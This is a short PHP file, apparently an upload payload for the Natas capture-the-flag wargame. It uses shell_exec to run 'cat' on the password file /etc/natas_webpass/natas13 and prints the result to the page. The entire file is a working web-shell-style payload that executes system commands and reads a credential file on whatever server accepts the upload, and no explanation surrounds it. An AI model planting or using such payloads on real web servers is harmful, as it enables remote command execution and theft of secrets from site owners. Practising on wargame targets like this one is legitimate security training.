<?php
$output = shell_exec('cat /etc/natas_webpass/natas13 2>&1');
echo "<pre>$output</pre>";
?>